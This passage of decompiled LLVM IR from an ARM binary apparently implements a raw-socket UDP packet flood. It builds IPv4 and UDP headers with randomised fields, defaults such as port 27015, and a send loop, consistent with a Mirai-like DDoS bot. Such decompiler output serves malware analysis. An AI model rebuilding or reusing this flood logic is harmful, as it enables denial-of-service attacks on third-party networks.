  %v3_d03c = trunc i32 %v2_d03c to i16
  %v3_d040 = load i32, i32* @r5, align 4
  %v4_d040 = add i32 %v3_d040, 10
  %v5_d040 = inttoptr i32 %v4_d040 to i16*
  store i16 %v3_d03c, i16* %v5_d040, align 2
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_d048 = load i32, i32* @r6, align 4
  %v3_d048 = add i32 %v2_d048, 6
  %v4_d048 = inttoptr i32 %v3_d048 to i16*
  store i16 0, i16* %v4_d048, align 2
  %v0_d04c = load i32, i32* @r6, align 4
  store i32 %v0_d04c, i32* @r1, align 4
  %v1_d050 = add i32 %v0_d04c, 4
  %v2_d050 = inttoptr i32 %v1_d050 to i16*
  %v3_d050 = load i16, i16* %v2_d050, align 2
  %v4_d050 = zext i16 %v3_d050 to i32
  store i32 %v4_d050, i32* %r2.global-to-local, align 4
  %v0_d054 = load i32, i32* @sl, align 4
  store i32 %v0_d054, i32* %r3.global-to-local, align 4
  %v0_d058 = load i32, i32* @r5, align 4
  store i32 %v0_d058, i32* %r0.global-to-local, align 4
  %v4_d05c = call i32 @function_dce8(i32 %v0_d058, i32 %v0_d04c, i32 %v4_d050, i32 %v0_d054)
  %v5_d05c = trunc i32 %v4_d05c to i16
  store i32 %v4_d05c, i32* %r0.global-to-local, align 4
  %v3_d060 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_d060, i32* %r3.global-to-local, align 4
  %v3_d064 = mul i32 %v3_d060, 32
  store i32 %v3_d064, i32* %lr.global-to-local, align 4
  %v3_d068 = load i32, i32* @r6, align 4
  %v4_d068 = add i32 %v3_d068, 6
  %v5_d068 = inttoptr i32 %v4_d068 to i16*
  store i16 %v5_d05c, i16* %v5_d068, align 2
  %v0_d06c = load i32, i32* %lr.global-to-local, align 4
  %v1_d06c = load i32, i32* %r3.global-to-local, align 4
  %tmp63 = mul i32 %v1_d06c, -8
  %v5_d06c = add i32 %v0_d06c, %tmp63
  store i32 %v5_d06c, i32* %lr.global-to-local, align 4
  %v0_d070 = load i32, i32* @r6, align 4
  %v1_d070 = add i32 %v0_d070, 2
  %v2_d070 = inttoptr i32 %v1_d070 to i16*
  %v3_d070 = load i16, i16* %v2_d070, align 2
  %v1_d074 = load i32, i32* @r8, align 4
  %v2_d074 = add i32 %v1_d074, %v5_d06c
  store i32 %v2_d074, i32* @lr, align 4
  %v3_d078 = add i32 %v2_d074, 2
  %v4_d078 = inttoptr i32 %v3_d078 to i16*
  store i16 %v3_d070, i16* %v4_d078, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_d084 = load i32, i32* @r5, align 4
  store i32 %v0_d084, i32* %r1.global-to-local, align 4
  %v0_d088 = load i32, i32* @fp, align 4
  store i32 %v0_d088, i32* %r0.global-to-local, align 4
  %v0_d08c = load i32, i32* @sb, align 4
  store i32 %v0_d08c, i32* %r2.global-to-local, align 4
  %v0_d090 = load i32, i32* @lr, align 4
  %v6_d098 = call i32 @function_138bc(i32 %v0_d088, i32 %v0_d084, i32 %v0_d08c, i32 16384, i32 %v0_d090, i32 16)
  %v3_d09c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_d09c, i32* %r3.global-to-local, align 4
  %v1_d0a0 = add i32 %v3_d09c, 1
  store i32 %v1_d0a0, i32* %r0.global-to-local, align 4
  %v1_d0a4 = load i32, i32* @r7, align 4
  %v9_d0a4 = icmp eq i32 %v1_d0a0, %v1_d0a4
  store i1 %v9_d0a4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_d0a0, i32* %stack_var_-44, align 4
  %v5_d0ac = icmp slt i32 %v1_d0a0, %v1_d0a4
  br i1 %v5_d0ac, label %dec_label_pc_cfc4, label %dec_label_pc_d0b0

dec_label_pc_d0b0:                                ; preds = %dec_label_pc_d02c
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_d0b4 = icmp eq i32 %v1_d0a4, 0
  store i1 %v2_d0b4, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_d0b4, label %dec_label_pc_cfb0, label %dec_label_pc_cfc0

dec_label_pc_d0c4:                                ; preds = %dec_label_pc_cfc4
  %v1_d0c4 = add i32 %v2_cfcc, 16
  %v2_d0c4 = inttoptr i32 %v1_d0c4 to i32*
  %v3_d0c4 = load i32, i32* %v2_d0c4, align 4
  %v0_d0c8 = call i32 @function_f700()
  store i32 %v0_d0c8, i32* %r0.global-to-local, align 4
  %v3_d0cc = load i32, i32* %stack_var_-44, align 4
  %v5_d0d4 = mul i32 %v3_d0cc, 24
  %v1_d0d8 = and i32 %v3_d0c4, 16711680
  store i32 %v1_d0d8, i32* %ip.global-to-local, align 4
  %v3_d0dc = udiv i32 %v3_d0c4, 16777216
  %v4_d0e0 = udiv i32 %v1_d0d8, 256
  %v5_d0e0 = or i32 %v4_d0e0, %v3_d0dc
  store i32 %v5_d0e0, i32* %r2.global-to-local, align 4
  %v1_d0e4 = load i32, i32* @r8, align 4
  %v2_d0e4 = add i32 %v1_d0e4, %v5_d0d4
  store i32 %v2_d0e4, i32* %r1.global-to-local, align 4
  %v1_d0e8 = and i32 %v3_d0c4, 65280
  store i32 %v1_d0e8, i32* %r3.global-to-local, align 4
  %v1_d0ec = add i32 %v2_d0e4, 20
  %v2_d0ec = inttoptr i32 %v1_d0ec to i8*
  %v3_d0ec = load i8, i8* %v2_d0ec, align 1
  %v4_d0ec = zext i8 %v3_d0ec to i32
  store i32 %v4_d0ec, i32* %ip.global-to-local, align 4
  %v5_d0f4 = call i32 @llvm.bswap.i32(i32 %v3_d0c4)
  %v7_d0f8 = lshr i32 %v0_d0c8, %v4_d0ec
  %v8_d0f8 = add i32 %v7_d0f8, %v5_d0f4
  store i32 %v8_d0f8, i32* %r2.global-to-local, align 4
  %v1_d0fc = and i32 %v8_d0f8, 16711680
  store i32 %v1_d0fc, i32* %r0.global-to-local, align 4
  %v1_d108 = and i32 %v8_d0f8, 65280
  store i32 %v1_d108, i32* %r1.global-to-local, align 4
  %v5_d110 = call i32 @llvm.bswap.i32(i32 %v8_d0f8)
  %v1_d114 = load i32, i32* @r5, align 4
  %v2_d114 = add i32 %v1_d114, 16
  %v3_d114 = inttoptr i32 %v2_d114 to i32*
  store i32 %v5_d110, i32* %v3_d114, align 4
  store i32 %v6_cddc, i32* %r3.global-to-local, align 4
  store i1 %v8_d11c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_d11c, label %dec_label_pc_d124, label %dec_label_pc_cff4

dec_label_pc_d124:                                ; preds = %dec_label_pc_d0c4, %dec_label_pc_cfe8
  %v0_d124 = call i32 @function_f700()
  store i32 %v0_d124, i32* %r0.global-to-local, align 4
  store i32 %v3_ce6c, i32* %ip.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_d134, i1* %cpsr_z.global-to-local, align 1
  %v1_d138 = load i32, i32* @r5, align 4
  %v2_d138 = add i32 %v1_d138, 12
  %v3_d138 = inttoptr i32 %v2_d138 to i32*
  store i32 %v0_d124, i32* %v3_d138, align 4
  br i1 %v3_d134, label %dec_label_pc_d140, label %dec_label_pc_d124.dec_label_pc_d008_crit_edge

dec_label_pc_d124.dec_label_pc_d008_crit_edge:    ; preds = %dec_label_pc_d124
  %v1_d00c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_d008

dec_label_pc_d140:                                ; preds = %dec_label_pc_d124, %dec_label_pc_cff4
  %v0_d140 = call i32 @function_f700()
  %v1_d140 = trunc i32 %v0_d140 to i16
  %v3_d144 = load i32, i32* @r5, align 4
  %v4_d144 = add i32 %v3_d144, 4
  %v5_d144 = inttoptr i32 %v4_d144 to i16*
  store i16 %v1_d140, i16* %v5_d144, align 2
  store i32 %v3_ce4c, i32* %r0.global-to-local, align 4
  %v1_d14c = load i32, i32* @r4, align 4
  %v9_d14c = icmp eq i32 %v3_ce4c, %v1_d14c
  store i1 %v9_d14c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_d14c, label %dec_label_pc_d154, label %dec_label_pc_d014

dec_label_pc_d154:                                ; preds = %dec_label_pc_d140, %dec_label_pc_d008
  %v0_d154 = call i32 @function_f700()
  %v1_d154 = trunc i32 %v0_d154 to i16
  store i32 %v0_d154, i32* %r0.global-to-local, align 4
  store i32 %v3_ce64, i32* %r1.global-to-local, align 4
  %v1_d15c = load i32, i32* @r4, align 4
  %v9_d15c = icmp eq i32 %v3_ce64, %v1_d15c
  store i1 %v9_d15c, i1* %cpsr_z.global-to-local, align 1
  %v3_d160 = load i32, i32* @r5, align 4
  %v4_d160 = add i32 %v3_d160, 20
  %v5_d160 = inttoptr i32 %v4_d160 to i16*
  store i16 %v1_d154, i16* %v5_d160, align 2
  br i1 %v9_d15c, label %dec_label_pc_d168, label %dec_label_pc_d020

dec_label_pc_d168:                                ; preds = %dec_label_pc_d154, %dec_label_pc_d014
  %v0_d168 = call i32 @function_f700()
  %v1_d168 = trunc i32 %v0_d168 to i16
  store i32 %v0_d168, i32* %r0.global-to-local, align 4
  store i32 %v1_cdc8, i32* %r3.global-to-local, align 4
  store i1 %v2_d170, i1* %cpsr_z.global-to-local, align 1
  %v3_d174 = load i32, i32* @r6, align 4
  %v4_d174 = add i32 %v3_d174, 2
  %v5_d174 = inttoptr i32 %v4_d174 to i16*
  store i16 %v1_d168, i16* %v5_d174, align 2
  br i1 %v2_d170, label %dec_label_pc_d02c, label %dec_label_pc_d17c

dec_label_pc_d17c:                                ; preds = %dec_label_pc_d020, %dec_label_pc_d168
  %v0_d17c = load i32, i32* @r5, align 4
  %v1_d17c = add i32 %v0_d17c, 28
  store i32 %v1_d17c, i32* %r0.global-to-local, align 4
  store i32 %v0_ce94, i32* %r1.global-to-local, align 4
  %v2_d184 = inttoptr i32 %v1_d17c to i16*
  %v3_d184 = call i32 @function_f900(i16* %v2_d184, i32 %v0_ce94)
  store i32 %v3_d184, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_d02c

dec_label_pc_d18c:                                ; preds = %dec_label_pc_ce00
  %v0_d18c = load i32, i32* @fp, align 4
  store i32 %v0_d18c, i32* %r0.global-to-local, align 4
  %v1_d190 = call i32 @function_1314c(i32 %v0_d18c)
  store i32 %v1_d190, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_d194

dec_label_pc_d194:                                ; preds = %dec_label_pc_ccb8, %dec_label_pc_d18c
  %v1_d19c = phi i32 [ %v3_cdf0, %dec_label_pc_ccb8 ], [ %v1_d190, %dec_label_pc_d18c ]
  store i32 %v18_ccb8, i32* %sb.global-to-local, align 4
  store i32 %v27_ccb8, i32* %lr.global-to-local, align 4
  ret i32 %v1_d19c

; uselistorder directives
  uselistorder i32 %v0_d168, { 1, 0 }
  uselistorder i32 %v0_d154, { 1, 0 }
  uselistorder i32 %v1_d14c, { 1, 0 }
  uselistorder i32 %v3_d0c4, { 2, 1, 3, 0 }
  uselistorder i32 %v1_d0a0, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v5_d06c, { 1, 0 }
  uselistorder i32 %v4_d05c, { 1, 0 }
  uselistorder i1 %v2_d170, { 2, 3, 1, 0 }
  uselistorder i1 %v3_d134, { 3, 2, 0, 1 }
  uselistorder i32 %v3_cee0, { 1, 0 }
  uselistorder i16 %rev, { 1, 0 }
  uselistorder i32 %v3_cec8, { 1, 0 }
  uselistorder i32 %v1_ce98, { 1, 0, 2 }
  uselistorder i32 %v1_ce94, { 1, 0, 2 }
  uselistorder i32 %v3_ce6c, { 2, 1, 0, 3 }
  uselistorder i32 %v0_ce54, { 1, 0, 2, 3 }
  uselistorder i32 %v3_ce4c, { 4, 3, 2, 1, 5, 0 }
  uselistorder i32 %v0_ce44, { 1, 0, 2 }
  uselistorder i32 %v0_ce94, { 4, 5, 1, 0, 2, 3 }
  uselistorder i32 %v3_ce34, { 3, 1, 2, 0 }
  uselistorder i1 %v7_ce20, { 1, 0 }
  uselistorder i1 %v7_cdf4, { 1, 0 }
  uselistorder i32 %v3_cdf0, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v6_cddc, { 4, 3, 0, 5, 2, 1 }
  uselistorder i32 %v1_cdc8, { 2, 1, 3, 0 }
  uselistorder i32 %v1_cd54, { 1, 0 }
  uselistorder i32 %v1_cd30, { 1, 0 }
  uselistorder i32 %v6_cd28, { 1, 0 }
  uselistorder i32 %v7_cd10, { 1, 0, 2, 3 }
  uselistorder i8 %v5_cd0c, { 1, 0 }
  uselistorder i32 %v6_ccec, { 1, 0 }
  uselistorder i32 %v2_ccd4, { 0, 3, 1, 2 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 18, 17, 19, 20, 21, 22, 23, 24, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 22, 21, 23, 25, 24, 26, 27, 29, 28, 31, 30, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 4, 3, 6, 7, 5, 9, 8, 11, 10, 12, 15, 13, 14, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 34, 30, 31, 32, 33, 35, 37, 36, 38, 39, 40, 41, 42, 43, 44, 45, 46, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_d194, { 1, 0 }
  uselistorder label %dec_label_pc_d17c, { 1, 0 }
  uselistorder label %dec_label_pc_d02c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_cfc0, { 1, 0 }
  uselistorder label %dec_label_pc_cfb0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_cfb0.preheader, { 1, 0 }
  uselistorder label %.thread9, { 1, 0 }
  uselistorder label %bb50, { 1, 0 }
  uselistorder label %bb48, { 1, 0 }
}

define i32 @function_d1a4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_d1a4:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %v3_d1a4 = load i32, i32* @r4, align 4
  %v27_d1a4 = load i32, i32* @lr, align 4
  store i32 %arg2, i32* @sl, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r8, align 4
  %v2_d1c0 = call i32 @function_144a8(i32 %arg1, i32 4)
  %v0_d1c4 = load i32, i32* @r5, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_d1c0, i32* @fp, align 4
  %v0_d1d4 = load i32, i32* @r4, align 4
  %v4_d1d8 = inttoptr i32 %v0_d1c4 to i32*
  %v5_d1d8 = call i32 @function_a45c(i32 %v0_d1d4, i32* %v4_d1d8, i32 2, i32 0)
  %v1_d1e4 = urem i32 %v5_d1d8, 256
  store i32 %v1_d1e4, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_d1f0 = load i32, i32* @r4, align 4
  %v0_d1f4 = load i32, i32* @r5, align 4
  %v5_d1f8 = trunc i32 %v5_d1d8 to i8
  %v6_d1fc = inttoptr i32 %v0_d1f4 to i32*
  %v7_d1fc = call i32 @function_a45c(i32 %v0_d1f0, i32* %v6_d1fc, i32 3, i32 65535)
  %v0_d200 = load i32, i32* @r5, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_d1fc, i32* @r7, align 4
  %v0_d210 = load i32, i32* @r4, align 4
  %v4_d214 = inttoptr i32 %v0_d200 to i32*
  %v5_d214 = call i32 @function_a45c(i32 %v0_d210, i32* %v4_d214, i32 4, i32 64)
  %v1_d21c = urem i32 %v5_d214, 256
  store i32 %v1_d21c, i32* %ip.global-to-local, align 4
  %v0_d220 = load i32, i32* @r5, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_d22c = load i32, i32* @r4, align 4
  %v6_d234 = inttoptr i32 %v0_d220 to i32*
  %v7_d234 = call i32 @function_a45c(i32 %v0_d22c, i32* %v6_d234, i32 5, i32 0)
  %v1_d240 = urem i32 %v7_d234, 256
  store i32 %v1_d240, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_d24c = load i32, i32* @r4, align 4
  %v0_d250 = load i32, i32* @r5, align 4
  %v5_d258 = inttoptr i32 %v0_d250 to i32*
  %v6_d258 = call i32 @function_a45c(i32 %v0_d24c, i32* %v5_d258, i32 6, i32 65535)
  store i32 27015, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v0_d268 = load i32, i32* @r5, align 4
  store i32 %v6_d258, i32* @r6, align 4
  %v0_d270 = load i32, i32* @r4, align 4
  %v4_d274 = inttoptr i32 %v0_d268 to i32*
  %v5_d274 = call i32 @function_a45c(i32 %v0_d270, i32* %v4_d274, i32 7, i32 27015)
  store i32 %v5_d274, i32* @r4, align 4
  %v1_d280 = call i32 @function_11be8(i32 29)
  %v3_d28c = call i32 @function_11b24(i32 29, i32* nonnull %stack_var_-48)
  store i32 17, i32* %r2.global-to-local, align 4
  %v3_d2a0 = call i32 @function_13940(i32 2, i32 3, i32 17)
  %v7_d2a4 = icmp eq i32 %v3_d2a0, -1
  store i1 %v7_d2a4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_d2a0, i32* @sb, align 4
  br i1 %v7_d2a4, label %dec_label_pc_d5cc, label %dec_label_pc_d2b0

dec_label_pc_d2b0:                                ; preds = %dec_label_pc_d1a4
  store i32 1, i32* %stack_var_-44, align 4
  %v6_d2b8 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_d2b8, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_d2cc = call i32 @function_138fc(i32 %v3_d2a0, i32 0, i32 3, i32 %v6_d2b8, i32 ptrtoint (i32* @0 to i32))
  %v7_d2d0 = icmp eq i32 %v5_d2cc, -1
  store i1 %v7_d2d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_d2d0, label %dec_label_pc_d5c4, label %dec_label_pc_d2d8

dec_label_pc_d2d8:                                ; preds = %dec_label_pc_d2b0
  %v0_d2d8 = load i32, i32* @r4, align 4
  %v3_d2d8 = mul i32 %v0_d2d8, 65536
  store i32 %v3_d2d8, i32* @lr, align 4
  %v0_d2dc = load i32, i32* @r7, align 4
  %v0_d2e0 = load i32, i32* @r6, align 4
  %v3_d2e0 = mul i32 %v0_d2e0, 65536
  store i32 %v3_d2e0, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v3_d2e8 = urem i32 %v0_d2dc, 65536
  %v3_d2ec = urem i32 %v0_d2e0, 65536
  store i32 %v3_d2ec, i32* %r2.global-to-local, align 4
  %v3_d2f0 = urem i32 %v0_d2d8, 65536
  store i32 %v3_d2f0, i32* %r3.global-to-local, align 4
  %v0_d2f4 = load i32, i32* @r8, align 4
  %v2_d2f4 = icmp eq i32 %v0_d2f4, 0
  store i1 %v2_d2f4, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_d2f4, label %dec_label_pc_d430.preheader, label %dec_label_pc_d30c

dec_label_pc_d30c:                                ; preds = %dec_label_pc_d2d8
  %tmp34 = mul i32 %v0_d2dc, 256
  %v3_d31c = and i32 %tmp34, 65280
  store i32 %v3_d31c, i32* %r3.global-to-local, align 4
  %tmp35 = mul i32 %v0_d2e0, 256
  %v3_d320 = and i32 %tmp35, 65280
  store i32 %v3_d320, i32* %r2.global-to-local, align 4
  %tmp36 = mul i32 %v0_d2d8, 256
  %v3_d324 = and i32 %tmp36, 65280
  %tmp37 = udiv i32 %v0_d2dc, 256
  %v4_d328 = urem i32 %tmp37, 256
  %v5_d328 = or i32 %v4_d328, %v3_d31c
  store i32 %v5_d328, i32* @r5, align 4
  %tmp38 = udiv i32 %v0_d2e0, 256
  %v4_d32c = urem i32 %tmp38, 256
  %v5_d32c = or i32 %v4_d32c, %v3_d320
  store i32 %v5_d32c, i32* @r6, align 4
  %tmp39 = udiv i32 %v0_d2d8, 256
  %v4_d330 = urem i32 %tmp39, 256
  %v5_d330 = or i32 %v4_d330, %v3_d324
  store i32 %v5_d330, i32* @r7, align 4
  %v1_d3b8 = trunc i32 %v5_d214 to i8
  br label %dec_label_pc_d334

dec_label_pc_d334:                                ; preds = %.thread, %dec_label_pc_d30c
  %v2_d33c = call i32 @function_144a8(i32 128, i32 1)
  %v3_d340 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_d340, i32* %r2.global-to-local, align 4
  %v5_d348 = mul i32 %v3_d340, 24
  store i32 %v5_d348, i32* %r3.global-to-local, align 4
  %v1_d34c = load i32, i32* @fp, align 4
  %v2_d34c = load i32, i32* @r4, align 4
  %v5_d34c = mul i32 %v2_d34c, 4
  %v6_d34c = add i32 %v5_d34c, %v1_d34c
  %v7_d34c = inttoptr i32 %v6_d34c to i32*
  store i32 %v2_d33c, i32* %v7_d34c, align 4
  %v0_d350 = load i32, i32* %r3.global-to-local, align 4
  %v1_d350 = load i32, i32* @sl, align 4
  %v2_d350 = add i32 %v1_d350, %v0_d350
  store i32 %v2_d350, i32* %r3.global-to-local, align 4
  %v0_d354 = load i32, i32* @fp, align 4
  %v1_d354 = load i32, i32* %r2.global-to-local, align 4
  %v4_d354 = mul i32 %v1_d354, 4
  %v5_d354 = add i32 %v4_d354, %v0_d354
  %v6_d354 = inttoptr i32 %v5_d354 to i32*
  %v7_d354 = load i32, i32* %v6_d354, align 4
  store i32 %v7_d354, i32* @lr, align 4
  %v1_d35c = inttoptr i32 %v7_d354 to i8*
  %v2_d35c = load i8, i8* %v1_d35c, align 1
  %tmp = urem i8 %v2_d35c, 16
  %v1_d360 = zext i8 %tmp to i32
  %v1_d364 = or i32 %v1_d360, 64
  store i32 %v1_d364, i32* %r3.global-to-local, align 4
  %v1_d36c = trunc i32 %v1_d364 to i8
  store i8 %v1_d36c, i8* %v1_d35c, align 1
  %v0_d370 = load i32, i32* @lr, align 4
  %v1_d370 = inttoptr i32 %v0_d370 to i8*
  %v2_d370 = load i8, i8* %v1_d370, align 1
  %v1_d374 = and i8 %v2_d370, -16
  %v1_d378 = or i8 %v1_d374, 5
  store i8 %v1_d378, i8* %v1_d370, align 1
  %v2_d384 = load i32, i32* @lr, align 4
  %v3_d384 = add i32 %v2_d384, 1
  %v4_d384 = inttoptr i32 %v3_d384 to i8*
  store i8 %v5_d1f8, i8* %v4_d384, align 1
  %v3_d388 = load i32, i32* %stack_var_-48, align 4
  %v3_d38c = mul i32 %v3_d388, 65536
  %v1_d390 = add i32 %v3_d38c, 2097152
  %v3_d394 = udiv i32 %v1_d390, 256
  %v4_d39c = udiv i32 %v1_d390, 16777216
  %v5_d39c = or i32 %v3_d394, %v4_d39c
  %v3_d3a0 = urem i32 %v3_d388, 65536
  store i32 %v3_d3a0, i32* %r2.global-to-local, align 4
  %v1_d3a4 = trunc i32 %v5_d39c to i16
  %v2_d3a4 = load i32, i32* @lr, align 4
  %v3_d3a4 = add i32 %v2_d3a4, 2
  %v4_d3a4 = inttoptr i32 %v3_d3a4 to i16*
  store i16 %v1_d3a4, i16* %v4_d3a4, align 2
  %v0_d3a8 = load i32, i32* %r2.global-to-local, align 4
  %v1_d3a8 = mul i32 %v0_d3a8, 65536
  %v3_d3b0 = add i32 %v1_d3a8, 786432
  store i32 %v3_d3b0, i32* %r2.global-to-local, align 4
  store i32 %v1_d240, i32* %ip.global-to-local, align 4
  %v2_d3b8 = load i32, i32* @lr, align 4
  %v3_d3b8 = add i32 %v2_d3b8, 8
  %v4_d3b8 = inttoptr i32 %v3_d3b8 to i8*
  store i8 %v1_d3b8, i8* %v4_d3b8, align 1
  %v0_d3bc = load i32, i32* %r2.global-to-local, align 4
  %v3_d3bc = udiv i32 %v0_d3bc, 256
  %v1_d3c0 = and i32 %v3_d3bc, 65280
  %v0_d3c4 = load i32, i32* %ip.global-to-local, align 4
  %v2_d3c4 = icmp eq i32 %v0_d3c4, 0
  store i1 %v2_d3c4, i1* %cpsr_z.global-to-local, align 1
  %v4_d3c8 = udiv i32 %v0_d3bc, 16777216
  %v5_d3c8 = or i32 %v1_d3c0, %v4_d3c8
  store i32 %v5_d3c8, i32* %ip.global-to-local, align 4
  %v2_d3d0 = load i32, i32* @lr, align 4
  %v3_d3d0 = add i32 %v2_d3d0, 9
  %v4_d3d0 = inttoptr i32 %v3_d3d0 to i8*
  store i8 17, i8* %v4_d3d0, align 1
  store i32 ptrtoint (i32* @global_var_23394.88 to i32), i32* %r3.global-to-local, align 4
  %v0_d3d8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_d3d8, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_d334
  store i32 64, i32* %r2.global-to-local, align 4
  %v3_d3dc = load i32, i32* @lr, align 4
  %v4_d3dc = add i32 %v3_d3dc, 6
  %v5_d3dc = inttoptr i32 %v4_d3dc to i16*
  store i16 64, i16* %v5_d3dc, align 2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_d334, %bb
  %v2_d3e0 = load i32, i32* @global_var_23394.88, align 4
  %v1_d3e4 = load i32, i32* @lr, align 4
  %v2_d3e4 = add i32 %v1_d3e4, 12
  %v3_d3e4 = inttoptr i32 %v2_d3e4 to i32*
  store i32 %v2_d3e0, i32* %v3_d3e4, align 4
  store i32 %v2_d350, i32* %r2.global-to-local, align 4
  %v1_d3ec = add i32 %v2_d350, 16
  %v2_d3ec = inttoptr i32 %v1_d3ec to i32*
  %v3_d3ec = load i32, i32* %v2_d3ec, align 4
  %v1_d3f0 = load i32, i32* @lr, align 4
  %v2_d3f0 = add i32 %v1_d3f0, 16
  %v3_d3f0 = inttoptr i32 %v2_d3f0 to i32*
  store i32 %v3_d3ec, i32* %v3_d3f0, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v0_d3f8 = load i32, i32* @lr, align 4
  %v1_d3f8 = add i32 %v0_d3f8, 20
  store i32 %v1_d3f8, i32* %r4.global-to-local, align 4
  %v2_d3fc = add i32 %v0_d3f8, 28
  %v3_d3fc = inttoptr i32 %v2_d3fc to i32*
  store i32 -1, i32* %v3_d3fc, align 4
  %v0_d400 = load i32, i32* @r5, align 4
  %v1_d400 = trunc i32 %v0_d400 to i16
  %v2_d400 = load i32, i32* @lr, align 4
  %v3_d400 = add i32 %v2_d400, 4
  %v4_d400 = inttoptr i32 %v3_d400 to i16*
  store i16 %v1_d400, i16* %v4_d400, align 2
  %v0_d404 = load i32, i32* @lr, align 4
  %v1_d404 = add i32 %v0_d404, 32
  %v0_d408 = load i32, i32* %ip.global-to-local, align 4
  %v1_d408 = trunc i32 %v0_d408 to i16
  %v2_d408 = load i32, i32* %r4.global-to-local, align 4
  %v3_d408 = add i32 %v2_d408, 4
  %v4_d408 = inttoptr i32 %v3_d408 to i16*
  store i16 %v1_d408, i16* %v4_d408, align 2
  %v0_d40c = load i32, i32* @r7, align 4
  %v1_d40c = trunc i32 %v0_d40c to i16
  %v2_d40c = load i32, i32* %r4.global-to-local, align 4
  %v3_d40c = add i32 %v2_d40c, 2
  %v4_d40c = inttoptr i32 %v3_d40c to i16*
  store i16 %v1_d40c, i16* %v4_d40c, align 2
  %v0_d410 = load i32, i32* @r6, align 4
  %v1_d410 = trunc i32 %v0_d410 to i16
  %v2_d410 = load i32, i32* @lr, align 4
  %v3_d410 = add i32 %v2_d410, 20
  %v4_d410 = inttoptr i32 %v3_d410 to i16*
  store i16 %v1_d410, i16* %v4_d410, align 2
  %v3_d414 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_d414, i32* %r2.global-to-local, align 4
  %v3_d418 = call i32 @function_124f0(i32 %v1_d404, i32 %v3_d28c, i32 %v3_d414)
  %v3_d41c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_d41c, i32* %r3.global-to-local, align 4
  %v1_d420 = add i32 %v3_d41c, 1
  store i32 %v1_d420, i32* @r4, align 4
  %v1_d424 = load i32, i32* @r8, align 4
  %v9_d424 = icmp eq i32 %v1_d420, %v1_d424
  store i1 %v9_d424, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_d420, i32* %stack_var_-44, align 4
  %v5_d42c = icmp slt i32 %v1_d420, %v1_d424
  br i1 %v5_d42c, label %dec_label_pc_d334, label %dec_label_pc_d430.preheader

dec_label_pc_d430.preheader:                      ; preds = %.thread, %dec_label_pc_d2d8
  %v0_d434.ph = phi i32 [ 0, %dec_label_pc_d2d8 ], [ %v1_d424, %.thread ]
  %v3_d470 = icmp eq i32 %v3_d2e8, 65535
  br label %dec_label_pc_d430

